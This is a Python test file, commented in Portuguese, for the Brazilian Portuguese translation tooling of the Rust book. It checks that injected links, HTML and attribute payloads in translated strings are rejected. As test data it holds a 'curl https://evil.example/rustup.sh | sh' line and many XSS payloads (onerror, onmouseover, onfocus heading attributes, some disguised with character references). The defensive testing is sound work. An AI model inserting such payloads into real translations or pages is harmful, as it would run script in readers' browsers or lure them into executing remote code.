#!/usr/bin/env python3
"""Teste: a barreira do `apply.py --modo sync` contra injeção de link e de comando no msgstr.

Uso, da raiz do repositório:

    python3 -B i18n/tools/testes/teste_injecao_sync.py

Código de saída: 0 se todos os cenários passaram; 1 se algum falhou.

O `apply.py --modo sync` aceita o que o modelo do `traduz_delta.py` devolve, e a única barreira
automática entre essa resposta e o PO é o `validar_par` (checks/mensagens.py). O teste monta um PO
sintético numa pasta temporária, com quatro entradas de msgid e msgstr fixos (copiadas do livro; o
texto vivo do po/pt-BR.po não entra, então um sync que mude o msgid de uma delas, com fuzzy e `#| msgid`,
não derruba o CI), e um delta.json mínimo que as lista. Confere o que o `apply.py --dry-run` faz com
cada msgstr malicioso. Na 9e216b91061c (ch01-03), definição de link de
referência (também com rótulo que tem `\\` antes da quebra de linha ou destino na linha seguinte), bloco
recuado com `curl`, tag de bloco malformada (`<div =x onmouseover=...>`) e autolink de e-mail são rejeitados
(código 1); URL nua passa com aviso (código 0). Na da656932ca39 (ch02, Listing 2-1), o link, a imagem, o
autolink (de URL ou de e-mail), o `[texto][rótulo](destino)`, a tag HTML (`<img onerror>`), a tag de bloco
malformada e o título com atributos (`# x {onfocus=...}`) acrescentados à legenda (caption=) são rejeitados
(código 1): o mdbook-trpl-listing lê a legenda como Markdown (com os atributos de título ligados) e o HTML
dela vai cru para o livro. Nos títulos (cbae15a7cb00, ch06-02, sem slug; c81b79df3c64, "Installation", com
slug), o bloco `{...}` acrescentado ao fim (`{tabindex=0 autofocus onfocus=...}`) é rejeitado (código 1), também
quando fica antes do slug que o apply.py recoloca, quando uma chave ou o espaço depois dele é uma referência de
caractere (`&#125;`, `&lcub;`, `&#32;`: a ida e volta do gettext as devolve como o caractere) e também no modo
`capitulo` (o caminho do tradutor, do Copilot e do PR de capítulo): o mdbook o lê como atributos HTML do <hN>. Por fim, a regra (i) do check html (defesa em
profundidade: `on*=`, `autofocus` e `tabindex` no HTML pt-BR que a página em inglês não tem) roda sobre páginas
de mentira. Tudo o que grava fica num diretório temporário apagado no fim; a cópia do PO tem de sair idêntica de
cada --dry-run, o po/pt-BR.po real (se existir) não pode mudar, e não há rede nem build.
"""
import hashlib
import json
import subprocess
import sys
import tempfile
from pathlib import Path

RAIZ = Path(__file__).resolve().parents[3]          # i18n/tools/testes/ -> raiz do repositório
FERRAMENTAS = RAIZ / "i18n" / "tools"
sys.path.insert(0, str(FERRAMENTAS))

import po_util  # noqa: E402
import polib  # noqa: E402  (depois do po_util, que acusa a falta dele em português)
from checks import html as regras_html  # noqa: E402
from checks.mensagens import validar_par  # noqa: E402

# As entradas do PO sintético: (id, msgid, msgstr base, arquivo de origem). O msgid e o msgstr são cópias fixas
# do livro, não lidos do po/pt-BR.po; os cenários trocam trechos do msgstr base ("obtém", "Instalação"...).
ID = "9e216b91061c"
MSGID = "For more information about Cargo, check out [its documentation](https://doc.rust-lang.org/cargo/)."
BASE = "Para mais informações sobre Cargo, consulte [sua documentação](https://doc.rust-lang.org/cargo/)."
ID_LEGENDA = "da656932ca39"
MSGID_LEGENDA = ('<Listing number="2-1" file-name="src/main.rs" '
                 'caption="Code that gets a guess from the user and prints it">\n')
BASE_LEGENDA = ('<Listing number="2-1" file-name="src/main.rs" '
                'caption="Código que obtém um palpite do usuário e o imprime">\n')
ID_TITULO = "cbae15a7cb00"                 # título sem slug (o id dele tem `_`, que o slugs.py não grava)
MSGID_TITULO = "Catch-All Patterns and the `_` Placeholder"
BASE_TITULO = "Padrões curinga e o espaço reservado `_`"
ID_TITULO_SLUG = "c81b79df3c64"            # título com slug, que o apply.py recoloca no fim do msgstr
MSGID_TITULO_SLUG = "Installation"
BASE_TITULO_SLUG = "Instalação {#installation}"
ENTRADAS = (
    (ID, MSGID, BASE, "src/ch01-03-hello-cargo.md"),
    (ID_LEGENDA, MSGID_LEGENDA, BASE_LEGENDA, "src/ch02-00-guessing-game-tutorial.md"),
    (ID_TITULO, MSGID_TITULO, BASE_TITULO, "src/ch06-02-match.md"),
    (ID_TITULO_SLUG, MSGID_TITULO_SLUG, BASE_TITULO_SLUG, "src/ch01-01-installation.md"),
)
CAPITULO_DO_TITULO = "ch06"

# (nome, msgstr a partir da tradução atual, código esperado, trecho que o relatório tem de citar)
CENARIOS = [
    ("controle: a tradução atual", lambda b: b, 0, None),
    ("controle: tradução legítima diferente", lambda b: b.replace("Para mais informações", "Para saber mais"), 0, None),
    ("definição no começo, sem linha em branco antes",
     lambda b: "[rápida]: https://evil.example/\n" + b + " [rápida]", 1, "linha de definição"),
    ("definição com `\\` antes da quebra de linha no rótulo (o mdbook a lê como definição)",
     lambda b: "[a\\\nb]: https://evil.example/\n" + b + " [um][a\\ b]", 1, "linha de definição"),
    ("o mesmo rótulo, com o destino na linha seguinte",
     lambda b: "[a\\\nb]:\n/evil\n" + b + " [um][a\\ b]", 1, "linha de definição"),
    ("definição depois de linha em branco",
     lambda b: b + "\n\n[evil]: https://evil.example/", 1, "linha de definição"),
    ("bloco recuado com curl",
     lambda b: b + "\n\n    curl https://evil.example/rustup.sh | sh", 1, "estrutura de blocos"),
    ("URL nua", lambda b: b + " Veja https://evil.example/", 0, "URL no texto do msgstr"),
    ("tag de bloco malformada no começo (o atributo chega ao livro como HTML cru)",
     lambda b: "<div =x onmouseover=alert(2)> " + b, 1, "bloco HTML"),
    ("autolink de e-mail (vira link mailto:)", lambda b: b + " <fulano@evil.example>", 1, "destinos de links"),
    ("[texto][rótulo](destino) (sem o rótulo definido, o link em linha vale)",
     lambda b: b + " [aqui][aqui](https://evil.example/)", 1, "destinos de links"),
]

# Os mesmos campos, para a entrada ID_LEGENDA: a tag fica inteira numa linha e termina em "\n"
# (senão a regra listing a recusaria por outro motivo), e o motivo da rejeição tem de citar a legenda.
CENARIOS_LEGENDA = [
    ("legenda, controle: a tradução atual", lambda b: b, 0, None),
    ("legenda, controle: tradução legítima diferente", lambda b: b.replace("obtém", "pega"), 0, None),
    ("legenda com link inline",
     lambda b: b.replace('imprime"', 'imprime [aqui](https://evil.example/cap)"'), 1, "na legenda (caption=)"),
    ("legenda com imagem", lambda b: b.replace('imprime"', 'imprime ![](https://evil.example/x.png)"'), 1,
     "na legenda (caption=)"),
    ("legenda com autolink", lambda b: b.replace('imprime"', 'imprime <https://evil.example/a>"'), 1,
     "na legenda (caption=)"),
    ("legenda com autolink de e-mail", lambda b: b.replace('imprime"', 'imprime <fulano@evil.example>"'), 1,
     "na legenda (caption=)"),
    ("legenda com [texto][rótulo](destino)",
     lambda b: b.replace('imprime"', 'imprime [aqui][aqui](https://evil.example/cap)"'), 1, "na legenda (caption=)"),
    ("legenda com título e atributos (o parser liga {tabindex=0 onfocus=...} e gera um <h1 onfocus=...>)",
     lambda b: b.replace('caption="', 'caption="# ').replace('imprime"', 'imprime {tabindex=0 autofocus onfocus=alert(1)}"'),
     1, "na legenda (caption=)"),
    ("legenda com tag de bloco malformada (<div =x onmouseover=...>)",
     lambda b: b.replace('caption="', 'caption="<div =x onmouseover=alert(2)> '), 1, "na legenda (caption=)"),
    ("legenda com tag <img onerror>",
     lambda b: b.replace('imprime"', 'imprime <img src=x onerror=alert(1)>"'), 1, "na legenda (caption=)"),
    ("legenda com <a href> do atacante",
     lambda b: b.replace("Código", "<a href='https://evil.example/h'>Código</a>"), 1, "na legenda (caption=)"),
    ("legenda com definição de rótulo",
     lambda b: b.replace("Código", "[x]: https://evil.example/ Código"), 1, "na legenda (caption=)"),
    ("legenda com URL nua", lambda b: b.replace('imprime"', 'imprime https://evil.example/"'), 0,
     "URL no texto do msgstr"),
]

# Os mesmos campos, para o título sem slug. O mdbook 0.5.1 lê um `{...}` no fim da linha do título como atributos do
# <hN> (id, classes, chave=valor): `<h3 tabindex="0" autofocus onfocus="alert(3)">` roda ao carregar a página. O
# motivo da rejeição tem de citar o bloco e a posição.
CENARIOS_TITULO = [
    ("título, controle: a tradução atual", lambda b: b, 0, None),
    ("título, controle: tradução legítima diferente", lambda b: b.replace("curinga", "coringa"), 0, None),
    ("título com {tabindex=0 autofocus onfocus=...} (roda ao carregar a página)",
     lambda b: b + " {tabindex=0 autofocus onfocus=alert(3)}", 1, "no fim da linha"),
    # as referências de caractere: o mdbook-gettext as devolve como o caractere antes de o mdbook ler o título
    ("título com a chave final como referência (&#125;)",
     lambda b: b + " {tabindex=0 autofocus onfocus=alert(3)&#125;", 1, "no fim da linha"),
    ("título com o espaço depois do bloco como referência (&#32;)",
     lambda b: b + " {tabindex=0 autofocus onfocus=alert(3)}&#32;", 1, "no fim da linha"),
    ("título com {onfocus=...}", lambda b: b + " {onfocus=alert(3)}", 1, "no fim da linha"),
    ("título com a chave inicial como referência (&#123;)", lambda b: b + " &#123;onfocus=alert(3)}", 1,
     "no fim da linha"),
    ("título com as duas chaves como referência hexadecimal", lambda b: b + " &#x7B;onfocus=alert(3)&#x7D;", 1,
     "no fim da linha"),
    ("título com as duas chaves como referência nomeada (&lcub; e &rcub;)",
     lambda b: b + " &lcub;onfocus=alert(3)&rcub;", 1, "no fim da linha"),
    ("título com o tab depois do bloco como referência (&#9;)", lambda b: b + " {onfocus=alert(3)}&#9;", 1,
     "no fim da linha"),
    ("título com a quebra de linha depois do bloco como referência (&#10;)",
     lambda b: b + " {onfocus=alert(3)}&#10;", 1, "no fim da linha"),
    ("título com slug malformado escrito com referências", lambda b: b + " &#123;#x onfocus=alert(3)&#125;", 1,
     "slug malformado"),
    # o apply.py tira o `{#...}` final (os slugs vêm do slugs.py): sobra só o `{` solto, que não é bloco; o validar_par
    # recusa a forma inteira (conferida em confere_validar_par), por cautela com quem chamar só ele
    ("título com `{#` colado a outro `{` ({{#x onfocus=...}): o apply.py tira o `{#...}` final",
     lambda b: b + " {{#x onfocus=alert(3)}", 0, "removido"),
    ("título com bloco que tem espaço antes do # ({ #x onfocus=... })", lambda b: b + " { #x onfocus=alert(1) }", 1,
     "no fim da linha"),
    ("título com classe ({.c})", lambda b: b + " {.c}", 1, "no fim da linha"),
    ("título com o bloco colado ao texto e espaços no fim", lambda b: b + "{onfocus=x}   ", 1, "no fim da linha"),
]

# Para o título com slug: o apply.py tira o slug da tradução e recoloca o antigo no fim, então o bloco acrescentado
# fica ANTES do slug; o slugs.py remove o slug de um id inseguro e o bloco voltaria ao fim da linha.
CENARIOS_TITULO_SLUG = [
    ("título com slug, controle: a tradução atual", lambda b: b, 0, None),
    ("título com slug, controle: tradução legítima diferente", lambda b: b.replace("Instalação", "Como instalar"), 0,
     None),
    ("título com slug e atributos no lugar do slug",
     lambda b: b.replace(" {#installation}", " {tabindex=0 autofocus onfocus=alert(3)}"), 1, "no fim da linha"),
    ("título com slug e atributos antes do slug",
     lambda b: b.replace(" {#installation}", " {onfocus=alert(3)} {#installation}"), 1, "no fim da linha"),
    ("título com slug e atributos fechados por referência antes do slug",
     lambda b: b.replace(" {#installation}", " {onfocus=alert(3)&#125; {#installation}"), 1, "no fim da linha"),
]

# No modo `capitulo` (o caminho do tradutor, do Copilot e do PR de capítulo) rodam os dois controles, o bloco simples e
# os dois vetores de referência de caractere que passaram pelo apply.py: são os cinco primeiros de CENARIOS_TITULO.
N_TITULO_NO_CAPITULO = 5


def sha(caminho):
    return hashlib.sha256(Path(caminho).read_bytes()).hexdigest()


def sha_ou_none(caminho):
    return sha(caminho) if caminho.is_file() else None


def monta_po(caminho):
    """Grava o PO sintético com as `ENTRADAS`; devolve um problema (texto) ou None."""
    po = polib.POFile(wrapwidth=0)
    po.metadata = dict(po_util.CABECALHO)
    for id_, msgid, msgstr, arquivo in ENTRADAS:
        entrada = polib.POEntry(msgid=msgid, msgstr=msgstr, occurrences=[(arquivo, "1")])
        if po_util.entry_id(entrada) != id_:
            return f"o id de «{msgid[:40]}» não é mais {id_} (mudou o po_util.entry_id?)"
        po.append(entrada)
    po_util.salvar(po, caminho)
    return None


def roda_apply(tmp, copia, nome, id_, msgstr, modo="sync"):
    """Roda `apply.py --modo MODO --dry-run` com um item; devolve (código, relatório ou None, stderr).

    No modo sync o escopo é o delta.json do teste; no modo capitulo, o capítulo do título (ch06)."""
    traducoes = tmp / f"{nome}.json"
    traducoes.write_text(json.dumps([{"id": id_, "msgstr": msgstr}], ensure_ascii=False), encoding="utf-8")
    escopo = (["--modo", "sync", "--delta", str(tmp / "delta.json")] if modo == "sync"
              else ["--modo", "capitulo", "--capitulo", CAPITULO_DO_TITULO])
    proc = subprocess.run(
        [sys.executable, "-B", str(FERRAMENTAS / "apply.py"), "--po", str(copia), "--traducoes", str(traducoes),
         *escopo, "--dry-run"],
        cwd=RAIZ, capture_output=True, text=True, timeout=120, check=False)
    try:
        relatorio = json.loads(proc.stdout)
    except ValueError:
        relatorio = None
    return proc.returncode, relatorio, proc.stderr


def confere_cenario(tmp, copia, indice, id_, funcao, esperado, trecho, base, modo="sync"):
    antes = sha(copia)
    codigo, rel, err = roda_apply(tmp, copia, f"c{indice}", id_, funcao(base), modo)
    if sha(copia) != antes:
        return "a cópia do PO mudou depois do --dry-run"
    if codigo != esperado:
        return f"código {codigo}, esperava {esperado}; stderr: {err.strip()[-300:]}"
    if not isinstance(rel, dict):
        return "o apply.py não imprimiu o relatório JSON"
    if esperado == 1:
        motivos = " ".join(m for r in rel.get("rejeitadas", []) if r.get("id") == id_ for m in r.get("motivos", []))
        if rel.get("aplicadas") != 0 or not motivos:
            return f"devia rejeitar a entrada {id_}: {rel}"
        if trecho not in motivos:
            return f"o motivo da rejeição não cita «{trecho}»: {motivos[:300]}"
        return None
    avisos = " ".join(m for r in rel.get("avisos", []) if r.get("id") == id_ for m in r.get("motivos", []))
    if rel.get("aplicadas") != 1 or rel.get("rejeitadas"):
        return f"devia aceitar a entrada {id_}: {rel}"
    if trecho is None:
        if "URL no texto" in avisos or "definição" in avisos:
            return f"aviso inesperado de URL ou definição: {avisos[:300]}"
    elif trecho not in avisos:
        return f"o aviso esperado «{trecho}» não está em `avisos`: {avisos[:300] or rel}"
    return None


def confere_validar_par(base, base_legenda, base_titulo):
    """Cenários só contra o validar_par. (b) No mdbook 0.5.1 a definição de LINK depois de uma quebra
    simples sai como texto (não vira link), mas recusá-la é o conservador, então o teste só pede o
    'erro'. A definição de NOTA DE RODAPÉ `[^q]:` vale em qualquer começo de linha, mesmo no meio do
    parágrafo (vira nota de verdade no livro), e também é recusada. A legenda (caption=) do <Listing>
    é Markdown: o link acrescentado a ela é um 'erro' que cita a legenda, e a tradução normal passa. O
    bloco `{...}` no fim da linha de um título é um 'erro' que o cita (já decodificado, se uma chave ou o
    espaço depois dele é uma referência de caractere; aberto por um `{` de dentro de código também), antes do
    slug também."""
    achados = validar_par(MSGID, base + " [aqui][evil]\n[evil]: https://evil.example")
    if not any(sev == "erro" and "definição" in msg for sev, msg in achados):
        return f"definição depois de quebra simples: esperava um erro de definição, veio {achados}"
    achados = validar_par(MSGID, base + "\n[^q]: NOTA injetada")
    if not any(sev == "erro" and "definição" in msg for sev, msg in achados):
        return f"nota de rodapé no meio do parágrafo: esperava um erro de definição, veio {achados}"
    if validar_par(MSGID_LEGENDA, base_legenda):
        return f"a tradução atual da legenda devia passar sem achado, veio {validar_par(MSGID_LEGENDA, base_legenda)}"
    achados = validar_par(MSGID_LEGENDA, base_legenda.replace('imprime"', 'imprime [aqui](https://evil.example/cap)"'))
    if not any(sev == "erro" and "legenda" in msg and "https://evil.example/cap" in msg for sev, msg in achados):
        return f"link na legenda: esperava um erro que cita a legenda e o destino, veio {achados}"
    achados = validar_par(MSGID, base + " Veja https://evil.example/")
    if [sev for sev, _msg in achados] != ["aviso"]:
        return f"URL nua: esperava só um aviso, veio {achados}"
    if validar_par(MSGID_TITULO, base_titulo):
        return f"a tradução atual do título devia passar sem achado, veio {validar_par(MSGID_TITULO, base_titulo)}"
    for bloco in ("{tabindex=0 autofocus onfocus=alert(3)}", "{onfocus=x}", "{ #x onfocus=y }", "{.c}"):
        achados = validar_par(MSGID_TITULO, base_titulo + " " + bloco)
        if not any(sev == "erro" and bloco in msg and "no fim da linha" in msg for sev, msg in achados):
            return f"título com {bloco}: esperava um erro que cita o bloco e o fim da linha, veio {achados}"
    for texto in ("{onfocus=x&#125;", "&#123;onfocus=x}", "{onfocus=x}&#32;", "&lcub;onfocus=x&rcub;", "{onfocus=x}&Tab;"):
        achados = validar_par(MSGID_TITULO, base_titulo + " " + texto)
        if not any(sev == "erro" and "{onfocus=x}" in msg and "no fim da linha" in msg for sev, msg in achados):
            return f"título com {texto}: esperava um erro que cita o bloco já decodificado, veio {achados}"
    achados = validar_par(MSGID_TITULO, base_titulo + " {{#x onfocus=y}")
    if not any(sev == "erro" and "{#x onfocus=y}" in msg and "no fim da linha" in msg for sev, msg in achados):
        return f"`{{#` colado a outro `{{`: esperava um erro que cita o bloco, veio {achados}"
    achados = validar_par(MSGID_TITULO, base_titulo + " &#123;#x onfocus=y&#125;")
    if not any(sev == "erro" and "slug malformado" in msg for sev, msg in achados):
        return f"slug malformado escrito com referências: esperava um erro de slug, veio {achados}"
    achados = validar_par("Using `x{`", "Usando `x{` onfocus=alert(1)}")      # o `{` de dentro do código abre o bloco
    if not any(sev == "erro" and "{` onfocus=alert(1)}" in msg and "no fim da linha" in msg for sev, msg in achados):
        return f"`{{` dentro de código e `}}` fora: esperava um erro que cita o bloco, veio {achados}"
    if validar_par("Using `&#123;x&#125;`", "Usando `&#123;x&#125;`"):
        return "a referência dentro de código é texto: a tradução devia passar sem achado"
    achados = validar_par(MSGID_TITULO_SLUG, "Instalação {onfocus=x} {#installation}")
    if not any(sev == "erro" and "{onfocus=x}" in msg for sev, msg in achados):
        return f"bloco antes do slug: esperava um erro que cita o bloco, veio {achados}"
    if validar_par(MSGID_TITULO_SLUG, BASE_TITULO_SLUG):
        return f"a tradução atual do título com slug devia passar, veio {validar_par(MSGID_TITULO_SLUG, BASE_TITULO_SLUG)}"
    return None


class _Escopo:
    """Contexto mínimo da regra (i): `capitulos` None = todos os capítulos no escopo."""

    def __init__(self, capitulos=None):
        self.capitulos = capitulos

    def capitulo_no_escopo(self, capitulo):
        return self.capitulos is None or capitulo in self.capitulos


def confere_atributos_html():
    """Regra (i) do check html sobre páginas de mentira {nome: HTML} do inglês e do pt-BR.

    O mdbook escreve o `{tabindex=0 autofocus onfocus=alert(3)}` do fim de um título como atributos do <hN>;
    a regra acusa o `on*`, o `autofocus` e o `tabindex` do pt-BR que a página em inglês não tem, e só eles."""
    titulo = '<h3 id="x">Padrões</h3>'
    ataque = '<h3 tabindex="0" autofocus="" onfocus="alert(3)" id="x">Padrões</h3>'
    botao = '<button onclick="f()">ok</button>'
    pagina = "ch06-02-match.html"

    def achados(pt, en, escopo=None):
        paginas = lambda d: {n: regras_html._Pagina(n, h) for n, h in d.items()}  # noqa: E731
        return regras_html._atributos_perigosos(_Escopo(escopo), paginas(pt), paginas(en))

    casos = [
        ("páginas iguais", achados({pagina: titulo}, {pagina: titulo}), 0),
        ("o inglês também tem o onclick", achados({pagina: botao + titulo}, {pagina: botao + titulo}), 0),
        ("onfocus entre aspas e HTML escapado não são atributos",
         achados({pagina: '<p title="a onfocus=b">&lt;h3 onfocus=x&gt;</p>'}, {pagina: "<p>a</p>"}), 0),
        ("página só do pt-BR fica para a regra (f)", achados({pagina: ataque}, {}), 0),
        ("capítulo fora do escopo", achados({pagina: ataque}, {pagina: titulo}, {"ch01"}), 0),
        ("tabindex, autofocus e onfocus no <h3>", achados({pagina: ataque}, {pagina: titulo}), 1),
        ("onclick a mais que o inglês", achados({pagina: botao + botao}, {pagina: botao}), 1),
        ("onFocus em maiúsculas e aspas simples",
         achados({pagina: "<h3 onFocus='alert(3)' id=\"x\">a</h3>"}, {pagina: titulo}), 1),
        ("o print.html (global) entra mesmo com escopo", achados({"print.html": ataque}, {"print.html": titulo}, {"ch01"}), 1),
        ("o index.html, cópia da title-page.html, não repete o achado",
         achados({"title-page.html": ataque, "index.html": ataque}, {"title-page.html": titulo, "index.html": titulo}), 1),
        ("o index.html que não é cópia entra mesmo com escopo",
         achados({"title-page.html": titulo, "index.html": ataque}, {"title-page.html": titulo, "index.html": titulo},
                 {"ch01"}), 1),
    ]
    for nome, resultado_, esperado in casos:
        if len(resultado_) != esperado:
            return f"{nome}: esperava {esperado} achado(s), veio {resultado_}"
        if esperado and (resultado_[0].severidade != "erro" or "no pt-BR e não existem no inglês" not in resultado_[0].mensagem):
            return f"{nome}: devia ser um erro da regra (i), veio {resultado_[0]}"
    achado = casos[5][1][0]
    if not all(f"<h3 {a}>" in achado.mensagem for a in ("autofocus", "onfocus", "tabindex")) or achado.arquivo != pagina:
        return f"o achado devia citar a página e os três atributos do <h3>: {achado}"
    return None


def main():
    po_real = RAIZ / "po" / "pt-BR.po"            # o teste não o usa: só confere que nada o altera
    sha_real = sha_ou_none(po_real)
    falhas = 0

    def resultado(nome, problema):
        nonlocal falhas
        if problema:
            falhas += 1
            print(f"FALHA  {nome}: {problema}")
        else:
            print(f"ok     {nome}")

    with tempfile.TemporaryDirectory(prefix="teste-injecao-sync-") as pasta:
        tmp = Path(pasta)
        copia = tmp / "copia.po"
        problema = monta_po(copia)
        if problema:
            print(f"FALHA ambiente: {problema}")
            return 1
        po_util.carregar(copia)                   # o PO sintético tem de ser um PO válido para o apply.py
        bases = {id_: msgstr for id_, _msgid, msgstr, _arquivo in ENTRADAS}
        (tmp / "delta.json").write_text(
            json.dumps({"capitulos": {"ch01": [{"id": ID}, {"id": ID_TITULO_SLUG}], "ch02": [{"id": ID_LEGENDA}],
                                      CAPITULO_DO_TITULO: [{"id": ID_TITULO}]}}), encoding="utf-8")
        resultado("validar_par: (b) definição após quebra simples, nota de rodapé, legenda, (e) URL nua e título",
                  confere_validar_par(bases[ID], bases[ID_LEGENDA], bases[ID_TITULO]))
        todos = ([(ID, c) for c in CENARIOS] + [(ID_LEGENDA, c) for c in CENARIOS_LEGENDA]
                 + [(ID_TITULO, c) for c in CENARIOS_TITULO] + [(ID_TITULO_SLUG, c) for c in CENARIOS_TITULO_SLUG])
        for indice, (id_, (nome, funcao, esperado, trecho)) in enumerate(todos):
            resultado(f"apply.py --modo sync --dry-run: {nome}",
                      confere_cenario(tmp, copia, indice, id_, funcao, esperado, trecho, bases[id_]))
        # o mesmo vetor no modo capitulo (o caminho do tradutor, do Copilot e do PR de capítulo)
        for indice, (nome, funcao, esperado, trecho) in enumerate(CENARIOS_TITULO[:N_TITULO_NO_CAPITULO], len(todos)):
            resultado(f"apply.py --modo capitulo --dry-run: {nome}",
                      confere_cenario(tmp, copia, indice, ID_TITULO, funcao, esperado, trecho, bases[ID_TITULO],
                                      "capitulo"))
    resultado("check html, regra (i): on*=, autofocus e tabindex do pt-BR que o inglês não tem", confere_atributos_html())
    resultado("o po/pt-BR.po real (se existe) ficou intacto",
              None if sha_ou_none(po_real) == sha_real else "o arquivo mudou")
    print(f"falhas={falhas}")
    return 1 if falhas else 0


if __name__ == "__main__":
    sys.exit(main())
